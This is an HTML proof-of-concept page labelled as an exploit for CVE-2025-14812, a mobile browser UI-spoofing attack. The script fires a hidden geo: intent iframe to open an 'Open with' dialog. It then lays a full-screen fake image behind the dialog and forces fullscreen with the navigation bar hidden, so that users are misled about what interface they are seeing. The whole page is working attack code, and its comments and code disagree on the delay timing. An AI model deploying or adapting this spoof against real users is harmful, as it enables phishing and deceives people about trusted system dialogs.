<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
    <title>Ultimate CVE-2025-14812 Combined PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #0b0e14;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f0f6fc;
        display: flex;
        align-items: center;
        justify-content: center;
        overflow: hidden;
      }
      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; z-index: 10; }
      button {
        width: 100%;
        max-width: 360px;
        padding: 18px 24px;
        font-size: 16px;
        font-weight: 600;
        background: #da3633;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
        transition: transform 0.1s, background 0.2s;
      }
      button:active { background: #b62324; transform: scale(0.98); }
      .info {
        margin-top: 20px;
        font-size: 13px;
        color: #8b949e;
        font-family: monospace;
        word-break: break-all;
        padding: 0 10px;
      }
      #spoof {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        object-fit: cover;
        z-index: 99999;
      }
    </style>
    <script>
      // Touch event handlers untuk manajemen fokus/blur input sentuh seluler
      addEventListener("touchstart", (event) => {});
      window.ontouchstart = (event) => {
        let input = document.getElementById("focusInput");
        if (input) input.focus();
      };
      
      addEventListener("touchend", (event) => {});
      window.ontouchend = (event) => {
        let input = document.getElementById("focusInput");
        if (input) input.blur();
      };
    </script>
  </head>
  <body>
    <!-- Hidden focus management input -->
    <input id="focusInput" style="width: 0px; height: 0px; border: none; outline: none; background: transparent; position: absolute; opacity: 0;" />

    <!-- Elemen Gambar Spoof yang menutupi seluruh layar secara penuh -->
    <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">

    <div class="container" id="mainContainer">
      <button id="execBtn">INITIALIZE ULTIMATE SPOOF & INTENT</button>
      <div class="info" id="statusInfo">Status: Ready for interaction.</div>
    </div>

    <script>
      let execButton = document.getElementById("execBtn");
      let statusInfo = document.getElementById("statusInfo");

      execButton.onclick = async function () {
        statusInfo.innerText = "Status: Deploying context vectors & intent dialog...";
        this.style.display = "none";

        try {
          // 1. Memicu iframe geo: intent untuk menampilkan dialog "Open with" secara instan
          let spoofFrame = document.createElement("iframe");
          spoofFrame.style.display = "none";
          spoofFrame.src = "geo:0,0?q=apple.com";
          document.body.appendChild(spoofFrame);

          statusInfo.innerText = "Status: Dialog triggered. Activating visual overlay & fullscreen in 2s...";

          // 2. Menampilkan gambar spoof secara instan di latar belakang dialog
          let spoofImg = document.getElementById("spoof");
          if (spoofImg) {
            spoofImg.style.display = "block";
          }

          // 3. Eksekusi Fullscreen dengan navigasi tersembunyi setelah jeda 2 detik untuk mengunci layar penuh
          setTimeout(() => {
            let docElement = document.documentElement;
            
            if (docElement.requestFullscreen) {
              docElement.requestFullscreen({ navigationUI: "hide" }).catch((err) => {
                console.debug("Fullscreen restricted:", err.message);
              });
            } else if (docElement.webkitRequestFullscreen) { /* Fallback WebKit lama */
              docElement.webkitRequestFullscreen();
            }

            // Menyembunyikan elemen kontainer informasi setelah masuk fullscreen penuh
            let container = document.getElementById("mainContainer");
            if (container) {
              container.style.display = "none";
            }
            
            statusInfo.innerText = "Status: Ultimate Fullscreen active & UI locked over dialog state.";
          }, 700);

        } catch (err) {
          statusInfo.innerText = "Status: Execution error: " + err.message;
          execButton.style.display = "block";
        }
      };
    </script>
  </body>
</html>
